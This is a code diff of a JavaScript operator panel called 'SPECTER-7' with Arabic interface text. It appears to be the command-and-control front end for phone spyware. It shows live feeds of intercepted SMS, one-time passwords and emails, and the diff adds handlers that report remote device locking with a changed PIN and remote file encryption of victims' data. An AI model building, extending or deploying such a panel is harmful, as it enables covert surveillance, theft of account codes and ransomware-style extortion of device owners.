@@ -1,3 +1,7 @@
+// ═══════════════════════════════════════════════════════
+//  SPECTER-7 — Panel Core
+// ═══════════════════════════════════════════════════════
+
 function getAuthToken() {
     return sessionStorage.getItem('auth_token') || '';
 }
@@ -56,7 +60,13 @@ function logout() {
     window.location.href = 'login.html';
 }
 
-function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
+function playNotificationSound() {
+    try {
+        const audio = new Audio('v.wav');
+        audio.volume = 1.0;
+        audio.play();
+    } catch (e) {}
+}
 
 function findContactName(number) {
     if (!allContacts || allContacts.length === 0 || !number) return null;
@@ -80,6 +90,9 @@ function showNotification(title, message, icon) {
     setTimeout(() => { if (div.parentElement) div.remove(); }, 8000);
 }
 
+// ═══════════════════════════════════════════════════════
+// SSE
+// ═══════════════════════════════════════════════════════
 function initSSE() {
     if (sse) { try { sse.close(); } catch(e){} sse = null; }
     if (!currentDevice) return;
@@ -149,7 +162,9 @@ function initSSE() {
             } catch (err) {}
         });
 
-        sse.addEventListener('new_sms', (e) => { try { addLiveMsg(JSON.parse(e.data)); } catch (err) {} });
+        sse.addEventListener('new_sms', (e) => {
+            try { addLiveMsg(JSON.parse(e.data)); } catch (err) {}
+        });
 
         sse.addEventListener('new_otp', (e) => {
             try {
@@ -198,6 +213,29 @@ function initSSE() {
                 let msg = `إلى: ${d.number || ''}`;
                 if (d.error && !d.success) msg += `\nالسبب: ${d.error}`;
                 showNotification(d.success ? '✅ SMS أُرسلت' : '❌ فشل إرسال SMS', msg, '📨');
+            } catch (err) {}
+        });
+
+        // ✅ نتيجة القفل
+        sse.addEventListener('lock_result', (e) => {
+            try {
+                const d = JSON.parse(e.data);
+                if (d.status === 'success') {
+                    showNotification('🔒 تم القفل', `الرمز الجديد: ${d.pin}`, '🔒');
+                } else if (d.status === 'locked_only') {
+                    showNotification('🔒 مقفل', 'تم القفل لكن الرمز لم يتغير (يحتاج Device Owner)', '⚠️');
+                }
+            } catch (err) {}
+        });
+
+        // ✅ نتيجة التشفير
+        sse.addEventListener('crypto_result', (e) => {
+            try {
+                const d = JSON.parse(e.data);
+                const isEncrypt = d.type === 'encryption_result';
+                const label = isEncrypt ? '🔒 تشفير' : '🔓 فك تشفير';
+                const msg = `${d.files_count} ملف\nالمدة: ${d.duration_sec} ثانية`;
+                showNotification(label, msg, isEncrypt ? '🔐' : '🔓');
             } catch (err) {}
         });
 
@@ -514,9 +552,8 @@ function renderLiveEmails() {
 function deleteLiveEmail(idx) { if (!confirm('حذف هذا البريد من الفيد؟')) return; liveEmails.splice(idx, 1); document.getElementById('liveEmailsCount').textContent = liveEmails.length; renderLiveEmails(); }
 
 // ═══════════════════════════════════════════════════════
-// ⚡ المميزات المتقدمة
+// ⚡ المميزات المتقدمة — جديد
 // ═══════════════════════════════════════════════════════
-
 function advancedAction(cmd, extra) {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
     const body = { device: currentDevice, command: cmd, token: getAuthToken() };
@@ -980,9 +1017,7 @@ async function updateLiveData() {
                 display.textContent = `${baseName} — 📱 ${data.sim_numbers[0]}`;
             }
         }
-    } catch (e) {
-        console.log('updateLiveData error:', e);
-    }
+    } catch (e) {}
 }
 
 async function loadAllData() {
@@ -1505,6 +1540,9 @@ async function triggerVoiceScan() {
     } catch (e) { alert('❌ خطأ: ' + e.message); }
 }
 
+// ═══════════════════════════════════════════════════════
+// 🔐 Device Approval
+// ═══════════════════════════════════════════════════════
 async function loadAuthorizedDevices() {
     if (!isOwner()) return;
     try {
